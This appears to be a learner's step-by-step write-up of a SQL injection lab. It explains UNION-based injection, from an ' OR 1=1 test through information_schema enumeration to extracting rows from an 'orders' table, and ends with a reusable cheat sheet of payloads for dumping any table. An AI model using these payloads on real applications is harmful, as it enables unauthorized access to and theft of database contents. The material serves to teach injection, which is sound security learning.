Step 1 — Confirm SQL Injection

' OR 1=1-- -
What this does:

Breaks the original query
Forces condition to always be true


Step 2 — Find number of columns

' UNION SELECT 1,2-- -
Why this works:

UNION must match original query column count

If wrong → error

If correct → values show up on page


Step 3 — Identify database context (optional but useful)

You could run:

' UNION SELECT @@version, database()-- -
Why:

@@version → DB version


Step 4 — Enumerate tables

You ran:

' UNION SELECT table_name, table_schema 
FROM information_schema.tables 
WHERE table_schema=database()-- -
Why this works:

information_schema = metadata DB

tables = list of all tables


Step 5 — Enumerate columns in target table

' UNION SELECT column_name, table_name 
FROM information_schema.columns 
WHERE table_name='orders'-- -
Why:

columns table = all column names

Step 6 — Extract data with a filter

Final payload:

' UNION SELECT id, date 
FROM orders 
WHERE MONTH(date)=6 AND DAY(date)=14-- -


Why this works:
1. Matches structure

2 columns 

Correct data types 

2. Uses real table

orders → from enumeration

3. Uses real column

date → from enumeration

4. Applies logic
MONTH(date)=6 AND DAY(date)=14


simple what i did:


Broke the query

Took control of output

Asked the database:

“What tables exist?”

“What columns exist?”

“Show me specific data”

Mental Model:

Think of SQLi like:

“I’m hijacking the query and making the database answer my questions instead.”

Each step is just:

Ask a better question

Use the response to ask the next one




Cheat Sheet
1. Test injection
' OR 1=1-- -
2. Find columns
' UNION SELECT 1,2-- -
3. Tables
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
4. Columns
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='TARGET'-- -
5. Dump data
' UNION SELECT col1, col2 FROM TARGET-- -
